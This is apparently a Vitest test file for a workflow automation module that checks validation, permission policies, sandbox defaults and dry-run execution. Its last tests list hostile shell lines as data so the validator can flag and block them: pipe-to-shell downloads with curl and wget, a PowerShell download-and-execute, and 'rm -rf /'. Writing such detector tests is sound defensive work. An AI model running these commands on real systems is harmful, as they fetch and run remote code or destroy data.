import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  AUTO_DOMAIN,
  planWorkflowContent,
  runWorkflowFile,
  validateWorkflowContent,
} from './index';

describe('auto domain', () => {
  it('declares automation workflow commands', () => {
    expect(AUTO_DOMAIN.name).toBe('auto');
    expect(AUTO_DOMAIN.commands.map((command) => command.name)).toEqual([
      'validate',
      'plan',
      'run',
    ]);
  });

  it('validates a simple workflow', () => {
    expect(
      validateWorkflowContent('name: demo\nsteps:\n  - name: hello\n    message: Hello\n')
    ).toEqual({
      schemaVersion: 1,
      status: 'ok',
      filePath: 'workflow.yml',
      workflow: {
        version: 1,
        name: 'demo',
        variables: {},
        permissions: {
          shell: 'blocked',
          fileWrites: 'blocked',
          network: 'blocked',
        },
        steps: [
          {
            name: 'hello',
            message: 'Hello',
          },
        ],
      },
      policy: {
        schemaVersion: 1,
        shell: 'blocked',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      sandbox: {
        schemaVersion: 1,
        root: 'workflow-directory',
        workflowDirectory: process.cwd(),
        shellCommands: 'blocked',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      warnings: [],
    });
  });

  it('validates workflow files with a UTF-8 BOM', () => {
    expect(
      validateWorkflowContent('\uFEFFname: demo\nsteps:\n  - name: hello\n    message: Hello\n')
        .workflow.name
    ).toBe('demo');
  });

  it('warns about shell steps', () => {
    expect(
      validateWorkflowContent('name: demo\nsteps:\n  - name: build\n    run: pnpm build\n').warnings
    ).toEqual(['Step `build` uses shell execution, which this first version will not run.']);
  });

  it('parses workflow execution policy and enables shell execution when prompt is specified', () => {
    expect(
      planWorkflowContent(
        'name: demo\npermissions:\n  shell: prompt\nsteps:\n  - name: build\n    run: pnpm build\n'
      )
    ).toMatchObject({
      schemaVersion: 1,
      policy: {
        schemaVersion: 1,
        shell: 'prompt',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      sandbox: {
        schemaVersion: 1,
        shellCommands: 'blocked',
      },
      steps: [
        {
          name: 'build',
          action: 'shell',
          requiredPermission: 'shell',
          policyDecision: 'allowed',
          blocked: false,
          operationPlan: {
            schemaVersion: 1,
            risk: 'high',
            confirmationRequired: true,
            executes: ['pnpm build'],
          },
        },
      ],
      warnings: [],
    });
  });

  it('warns about invalid workflow permission values', () => {
    expect(
      validateWorkflowContent(
        'name: demo\npermissions:\n  shell: always\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Permission `shell` value `always` is invalid; defaulting to blocked.']);
  });

  it('warns about unsupported workflow permission keys', () => {
    expect(
      validateWorkflowContent(
        'name: demo\npermissions:\n  filesystem: prompt\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Permission `filesystem` is not supported; ignoring it.']);
  });

  it('warns when JSON workflow permissions are not an object', () => {
    expect(
      validateWorkflowContent(
        JSON.stringify({
          name: 'demo',
          permissions: 'prompt',
          steps: [
            {
              name: 'hello',
              message: 'Hi',
            },
          ],
        }),
        'workflow.json'
      ).warnings
    ).toEqual(['Permissions must be an object; defaulting to blocked.']);
  });

  it('warns about unsupported explicit workflow versions', () => {
    expect(
      validateWorkflowContent('version: 2\nname: demo\nsteps:\n  - name: hello\n    message: Hi\n')
        .warnings
    ).toEqual(['Workflow version 2 is not supported; this foundation version expects 1.']);
  });

  it('warns about invalid explicit workflow versions', () => {
    expect(
      validateWorkflowContent(
        'version: later\nname: demo\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Workflow version `later` is invalid; defaulting to 1.']);
  });

  it('rejects unsupported workflow file extensions', () => {
    expect(() => validateWorkflowContent('name: demo\nsteps: []\n', 'workflow.ps1')).toThrow(
      'Workflow format is not supported yet.'
    );
  });

  it('plans variable substitution and blocked shell steps', () => {
    expect(
      planWorkflowContent(
        'name: demo\nvars:\n  target: ZaoWu\nsteps:\n  - name: hello\n    message: Hello {{target}}\n  - name: build\n    run: pnpm build\n'
      )
    ).toMatchObject({
      steps: [
        {
          name: 'hello',
          action: 'message',
          preview: 'Hello ZaoWu',
          blocked: false,
          policyDecision: 'allowed',
          operationPlan: {
            schemaVersion: 1,
            risk: 'low',
            confirmationRequired: false,
            executes: [],
          },
        },
        {
          name: 'build',
          action: 'shell',
          preview: 'pnpm build',
          blocked: true,
          requiredPermission: 'shell',
          policyDecision: 'blocked',
          reason: 'Shell permission is blocked by workflow policy.',
          operationPlan: {
            schemaVersion: 1,
            risk: 'high',
            confirmationRequired: true,
            executes: ['pnpm build'],
          },
        },
      ],
    });
  });

  it('warns about undefined variables', () => {
    expect(
      validateWorkflowContent(
        'name: demo\nsteps:\n  - name: hello\n    message: Hello {{target}}\n'
      ).warnings
    ).toEqual(['Step `hello` references undefined variable `target`.']);
  });

  it('previews workflow runs by default', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(filePath, 'name: demo\nsteps:\n  - name: hello\n    message: Hello\n', 'utf8');

    try {
      await expect(runWorkflowFile(filePath)).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'preview',
        sandbox: {
          schemaVersion: 1,
          workflowDirectory: root,
          shellCommands: 'blocked',
        },
        executed: [],
        skipped: ['hello: dry-run'],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('runs confirmed message steps while keeping shell steps blocked', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: demo',
        'steps:',
        '  - name: hello',
        '    message: Hello',
        '  - name: build',
        '    run: pnpm build',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'ok',
        executed: ['hello: Hello'],
        skipped: ['build: Shell permission is blocked by workflow policy.'],
        sandbox: {
          shellCommands: 'blocked',
          fileWrites: 'blocked',
          network: 'blocked',
        },
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('runs confirmed shell steps when shell policy is prompt', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: demo',
        'permissions:',
        '  shell: prompt',
        'steps:',
        '  - name: test_run',
        '    run: echo Hello Shell',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'ok',
        executed: ['test_run: Hello Shell'],
        skipped: [],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('detects dangerous commands during validation', () => {
    const dangerousCommands = [
      'rm -rf /some/path',
      'sudo apt-get update',
      'chmod +x script.sh',
      'chown root:root file',
      'curl http://example.com | sh',
      'wget http://example.com/script.sh | bash',
      'iex (New-Object Net.WebClient).DownloadString("http://example.com")',
    ];

    for (const cmd of dangerousCommands) {
      const result = validateWorkflowContent(
        `name: dangerous\nsteps:\n  - name: test\n    run: ${cmd}\n`
      );
      expect(
        result.warnings.some((w) => w.includes('safety violation: Dangerous command pattern found'))
      ).toBe(true);
    }
  });

  it('blocks planning of dangerous commands', () => {
    const result = planWorkflowContent(
      'name: dangerous\npermissions:\n  shell: prompt\nsteps:\n  - name: bad\n    run: rm -rf /\n'
    );
    expect(result.steps[0]).toMatchObject({
      name: 'bad',
      action: 'shell',
      blocked: true,
      policyDecision: 'blocked',
      reason: 'Dangerous command pattern found: `rm` with recursive/force flags.',
    });
  });

  it('throws safety error during execution of dangerous commands', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: dangerous',
        'permissions:',
        '  shell: prompt',
        'steps:',
        '  - name: test_run',
        '    run: sudo rm -rf /',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).rejects.toThrow(
        /Workflow step `test_run` was blocked for safety/
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});
